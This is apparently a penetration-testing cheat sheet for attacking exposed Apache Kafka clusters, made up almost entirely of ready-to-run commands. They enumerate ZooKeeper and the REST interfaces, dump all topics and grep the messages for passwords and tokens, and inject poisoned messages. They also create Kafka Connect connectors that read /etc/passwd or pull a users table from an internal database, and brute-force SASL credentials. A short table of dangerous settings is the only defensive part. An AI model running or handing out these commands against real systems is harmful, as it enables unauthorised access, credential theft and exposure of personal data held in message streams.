#Kafka #ApacheKafka #messaging #streaming #enterprise #dataengineering

## What is Apache Kafka?
Distributed event streaming platform. Central to modern enterprise data stacks — processes financial transactions, user events, internal application messages, often including PII and credentials. No authentication by default in many deployments. Multiple exposed interfaces: broker, ZooKeeper, Schema Registry, Connect, REST Proxy.

- Port: **TCP 9092** — Kafka broker (plaintext, no auth default)
- Port: **TCP 9093** — Kafka broker (SSL/TLS)
- Port: **TCP 9094** — Kafka broker (SASL)
- Port: **TCP 2181** — ZooKeeper (no auth, exposes full cluster metadata)
- Port: **TCP 2182** — ZooKeeper (TLS)
- Port: **TCP 8081** — Schema Registry (REST API)
- Port: **TCP 8082** — Kafka REST Proxy
- Port: **TCP 8083** — Kafka Connect REST API (RCE surface)
- Config: `/etc/kafka/server.properties`, `/opt/kafka/config/`

---

## Enumeration

```bash
# Nmap
nmap -p 9092,9093,2181,8081,8082,8083 -sV <target>

# Check ZooKeeper (no auth — exposes everything)
echo "dump" | nc -w 3 <target> 2181
echo "stat" | nc -w 3 <target> 2181
echo "ruok" | nc -w 3 <target> 2181   # should return "imok"

# List brokers via ZooKeeper
echo "ls /brokers/ids" | nc -w 3 <target> 2181
echo "get /brokers/ids/0" | nc -w 3 <target> 2181

# Check Kafka REST Proxy (no auth)
curl -s http://<target>:8082/topics | python3 -m json.tool
curl -s http://<target>:8082/brokers | python3 -m json.tool

# Check Schema Registry
curl -s http://<target>:8081/subjects | python3 -m json.tool
curl -s http://<target>:8081/config | python3 -m json.tool

# Kafka Connect REST API
curl -s http://<target>:8083/ | python3 -m json.tool
curl -s http://<target>:8083/connectors | python3 -m json.tool
```

---

## Connect / Access

```bash
# Install kafka-topics / kafka-console-consumer (Kafka client tools)
# Kali: apt install kafkacat  OR  use kcat
# Or download Kafka binary: https://kafka.apache.org/downloads

# kcat (kafkacat) — preferred CLI tool
apt install kafkacat
kcat -L -b <target>:9092                    # list brokers and topics (metadata)
kcat -b <target>:9092 -L -J | python3 -m json.tool  # JSON format

# kafka-topics (from Kafka distribution)
kafka-topics.sh --bootstrap-server <target>:9092 --list
kafka-topics.sh --bootstrap-server <target>:9092 --describe --topic <topic>

# ZooKeeper shell
kafka-configs.sh --zookeeper <target>:2181 --describe --entity-type brokers
zookeeper-shell.sh <target>:2181
```

---

## Attack Vectors

### Topic Enumeration + Data Consumption

```bash
# List all topics
kcat -L -b <target>:9092 | grep "topic"
kafka-topics.sh --bootstrap-server <target>:9092 --list

# Consume ALL messages from a topic (from beginning)
kcat -b <target>:9092 -t <topic_name> -C -o beginning -e
kafka-console-consumer.sh --bootstrap-server <target>:9092 \
  --topic <topic_name> --from-beginning

# Consume with key + metadata
kcat -b <target>:9092 -t <topic_name> -C -o beginning -f '%T %k: %s\n' -e

# Dump all topics — loop
for topic in $(kcat -L -b <target>:9092 2>/dev/null | grep "topic" | awk '{print $2}' | tr -d '"'); do
  echo "=== $topic ==="
  kcat -b <target>:9092 -t "$topic" -C -o beginning -c 100 -e 2>/dev/null
done

# Search consumed messages for credentials
kcat -b <target>:9092 -t <topic> -C -o beginning -e 2>/dev/null | \
  grep -i "password\|secret\|token\|api_key\|credential\|auth"
```

### ZooKeeper — Full Cluster Compromise

ZooKeeper stores all Kafka metadata including configs, ACLs, and consumer offsets. No auth by default.

```bash
# ZooKeeper CLI (from Kafka distribution)
zookeeper-shell.sh <target>:2181

# Inside ZooKeeper shell:
ls /
ls /brokers
ls /brokers/ids
get /brokers/ids/0            # broker connection info
ls /config
ls /config/topics
get /config/topics/<topic>   # topic config (retention, etc.)
ls /consumers                # consumer groups
ls /admin

# zkCli.sh (ZooKeeper's own client)
zkCli.sh -server <target>:2181
[zk] ls /
[zk] get /admin/delete_topics
```

### Kafka Connect REST API → RCE

Kafka Connect loads connector plugins — if the API is exposed without auth and you can reach an SMB/HTTP server, you can load a malicious JAR.

```bash
# Check Connect API
curl -s http://<target>:8083/ | python3 -m json.tool
curl -s http://<target>:8083/connector-plugins | python3 -m json.tool

# List running connectors
curl -s http://<target>:8083/connectors | python3 -m json.tool

# Create FileStream connector to read sensitive files
curl -s -X POST http://<target>:8083/connectors \
  -H "Content-Type: application/json" \
  -d '{
    "name": "file-reader",
    "config": {
      "connector.class": "FileStreamSource",
      "tasks.max": "1",
      "file": "/etc/passwd",
      "topic": "passwd-dump"
    }
  }'
# Then consume the topic to read file contents
kcat -b <target>:9092 -t passwd-dump -C -o beginning -e

# JDBC Connector — read from internal databases
curl -s -X POST http://<target>:8083/connectors \
  -H "Content-Type: application/json" \
  -d '{
    "name": "jdbc-reader",
    "config": {
      "connector.class": "io.confluent.connect.jdbc.JdbcSourceConnector",
      "connection.url": "jdbc:mysql://internal-db:3306/app",
      "connection.user": "root",
      "connection.password": "",
      "mode": "bulk",
      "query": "SELECT * FROM users",
      "topic.prefix": "db-"
    }
  }'
```

### Produce Malicious Messages (Inject / Poison)

```bash
# Produce messages to a topic
echo "injected_message" | kcat -b <target>:9092 -t <topic> -P

# Produce JSON
echo '{"event":"login","user":"admin","password":"injected"}' | \
  kcat -b <target>:9092 -t user-events -P

# Inject into topics consumed by internal services
# (potential for downstream SQL injection, deserialization, command injection
#  depending on how consumers process messages)
```

### SASL Credential Brute Force

```bash
# If SASL/PLAIN auth is enabled — brute force
# Modify client.properties:
cat > /tmp/client.properties << 'EOF'
security.protocol=SASL_PLAINTEXT
sasl.mechanism=PLAIN
sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username="admin" password="admin";
EOF

kafka-topics.sh --bootstrap-server <target>:9094 \
  --command-config /tmp/client.properties --list
```

---

## Sensitive Data Hunting

```bash
# Common topic names containing sensitive data in enterprise environments
for topic in user-events login-events audit-log payments transactions \
             user-data pii orders credentials secrets config; do
  echo "Checking: $topic"
  kcat -b <target>:9092 -t "$topic" -C -o beginning -c 10 -e 2>/dev/null
done

# Schema Registry — reveals data schemas (field names hint at sensitive data)
curl -s http://<target>:8081/subjects | python3 -m json.tool
for subject in $(curl -s http://<target>:8081/subjects | python3 -c "import sys,json; [print(s) for s in json.load(sys.stdin)]"); do
  echo "=== $subject ==="
  curl -s "http://<target>:8081/subjects/$subject/versions/latest"
done
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No `listeners` auth (PLAINTEXT only) | Unauthenticated broker access |
| ZooKeeper exposed (`clientPort=2181`) | Full cluster metadata without auth |
| Kafka Connect API exposed without auth | File read + potential RCE via connectors |
| Schema Registry exposed | Data schema enumeration |
| No TLS on broker | Message interception (MITM) |
| `auto.create.topics.enable=true` | Attacker can create topics |
| No ACLs configured | Any client reads/writes any topic |

---

## Quick Reference

| Goal | Command |
|---|---|
| List topics | `kcat -L -b host:9092` |
| Consume topic | `kcat -b host:9092 -t topic -C -o beginning -e` |
| ZooKeeper enum | `echo "ls /" \| nc -w 3 host 2181` |
| Schema Registry | `curl -s http://host:8081/subjects` |
| Connect API | `curl -s http://host:8083/connectors` |
| Read file via Connect | `POST /connectors` with FileStreamSource config |
| Search for creds | `kcat ... -e \| grep -i "password\|secret\|token"` |
